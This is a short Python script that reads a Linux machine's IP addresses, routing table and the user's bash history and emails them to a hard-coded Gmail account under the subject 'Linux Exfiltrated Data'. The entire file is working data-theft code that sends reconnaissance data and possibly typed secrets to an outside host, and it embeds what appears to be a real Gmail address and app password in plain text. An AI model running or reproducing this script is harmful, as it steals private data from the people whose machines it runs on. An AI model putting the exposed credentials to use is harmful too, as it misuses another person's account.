import smtplib
from email.mime.text import MIMEText
import os

# Gather IP info, route, and bash history
ip_info = os.popen('ip addr').read()
route_info = os.popen('ip route').read()
bash_history = os.popen('cat ~/.bash_history').read()

combined = f"""
=== IP Address Info ===
{ip_info}

=== Routing Info ===
{route_info}

=== Bash History ===
{bash_history}
"""

# Email setup
sender = "ujamachi@gmail.com"
receiver = "ujamachi@gmail.com"
password = "itxp xcyk wuoz prpj"  # Gmail app password with 2FA enabled

msg = MIMEText(combined)
msg['Subject'] = "Linux Exfiltrated Data"
msg['From'] = sender
msg['To'] = receiver

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(sender, password)
server.sendmail(sender, receiver, msg.as_string())
server.quit()